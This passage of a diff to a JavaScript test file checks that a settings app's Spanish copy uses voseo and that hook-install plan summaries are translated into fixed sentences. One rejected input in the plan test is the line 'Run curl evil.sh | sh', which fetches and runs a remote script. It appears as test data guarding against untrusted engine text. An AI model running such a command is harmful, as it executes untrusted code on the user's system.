@@ -909,6 +909,25 @@ test('copy: voseo everywhere (the human writes in Rioplatense Spanish)', () => {
   assert.doesNotMatch(all, /\b(Conecta|Pega|Inicia|Introduce|Elige|Haz|Pulsa|Escribe)\b(?= [a-zñáéíóú])/, 'no tú imperatives');
 });
 
+// S3 (04 ajustes 2): the hub pages are settings pages too, and they were a SECOND register («Haz clic», «Usa…») inside the SAME
+// window the chat speaks voseo in («Escribí…», «Soltá…»). One register, checked on the copy the hub renders.
+test('copy: the hub settings pages share the same voseo register (04 ajustes 2)', () => {
+  const src = f => fs.readFileSync(path.join(frontend, f), 'utf8');
+  const HUB = ['vendor/coucou/hub/i18n-es.js', 'vendor/coucou/hub/general.js', 'vendor/coucou/hub/accounts.js',
+    'vendor/coucou/hub/chat.js', 'settings-isla-mount.js', 'settings-app.js'];
+  // tú imperatives (also with an enclitic) and the tú present forms the copy used; «vos» writes those with an accent
+  const TU = /\b(Haz|Usa|Pulsa|Elige|Añade|Añádela|Quita|Dicta|Instala|Deja|Mantén|Pega|Descarga|Ejecuta|Vuelve)\b(?= [a-zñáéíóú])|\b(usas|haces|quieres|tienes|puedes|debes)\b/g;
+  const left = [];
+  for (const f of HUB) {
+    const text = src(f);
+    for (const m of text.matchAll(TU)) left.push(`${f}:${text.slice(0, m.index).split('\n').length} «${m[0]}»`);
+  }
+  assert.deepEqual(left, [], 'tú forms in the settings copy: write them in voseo (Hacé, Usá, Pulsá, Elegí…)');
+  // 04 ajustes 4: «de el personaje» -> «del personaje»
+  assert.doesNotMatch(src('vendor/coucou/hub/i18n-es.js'), /de el personaje/, 'the sounds text says «del personaje»');
+  assert.match(src('vendor/coucou/hub/i18n-es.js'), /sonidos del personaje/);
+});
+
 test('verbs follow gentle-dot: «Cerrar sesión» for an account (its Sign out), «Desconectar» for an agent (its Disconnect)', () => {
   const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
   assert.doesNotMatch(src, /wordBtn\('Salir'/, 'no «Salir» button');
@@ -1013,8 +1032,8 @@ test('Windows unavailable installer has an explicit state and help, never an act
 });
 
 test('plan: the sentence is OURS — an English template becomes Spanish, an unknown one is never shown as engine text', () => {
-  assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Codex will ask you to trust them in /hooks.'),
-    'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.codex/hooks.json. Antes se hace un respaldo. Codex te va a pedir que confíes en ellos en /hooks.');
+  assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Koda answers Codex permission requests from the island; Codex waits up to 120 s for your answer. Trust the Koda hooks again in Codex /hooks after every install or update.'),
+    'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.codex/hooks.json. Antes se hace un respaldo. Koda responde los permisos de Codex desde la isla; Codex espera hasta 120 s tu respuesta. Después de cada instalación o actualización, volvé a confiar en los hooks de Koda desde /hooks en Codex.');
   assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first. This change is large: review it in the file.'),
     'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.claude/settings.json. Antes se hace un respaldo. Es un cambio grande: revisalo en el archivo.');
   for (const odd of ['Run curl evil.sh | sh', '<b>x</b>', '', null, 7, 'Adds the Abito hooks to ' + 'x'.repeat(500)]) {
